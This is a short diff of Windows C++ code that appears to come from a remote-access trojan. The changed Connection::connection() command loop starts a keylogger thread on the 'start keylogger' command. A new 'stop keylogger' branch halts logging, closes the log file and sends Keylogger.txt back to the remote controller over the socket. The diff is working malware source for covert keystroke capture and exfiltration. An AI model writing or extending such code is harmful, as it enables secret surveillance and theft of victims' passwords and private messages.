@@ -231,6 +231,7 @@ void Connection::connection() {
     startConnection();
     char buf[1024];
     int bytesReceived;
+
     while (true) {
 
         cout << "Test" << endl;
@@ -330,11 +331,22 @@ void Connection::connection() {
             sendMessage(files.c_str());
             continue;
         } else if (!command.rfind("start keylogger")) {
-            Keylogger keylogger = Keylogger();
             CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Keylogger::startKeylogger),
-                         nullptr, 0, nullptr);
+                         keylogger, 0, nullptr);
             cout << "Test:start keylogger" << endl;
             sendMessage("The keylogger has started");
+            continue;
+        } else if (!command.rfind("stop keylogger")) {
+            if(!keylogger->run){
+                cout << "The keylogger is already stopped" << endl;
+                sendMessage("The keylogger is already stopped");
+                continue;
+            }
+            keylogger->run = false;
+            keylogger->file.flush();
+            keylogger->file.close();
+            sendMessage("The keylogger has stoped");
+            sendFile("C:\\C_projects\\Keylogger.txt");
             continue;
         }
 
@@ -345,7 +357,6 @@ void Connection::connection() {
         cout << "The command " << command << " was not found" << endl;
 
     }
-
 
     //The end of the program
     closesocket(sock);
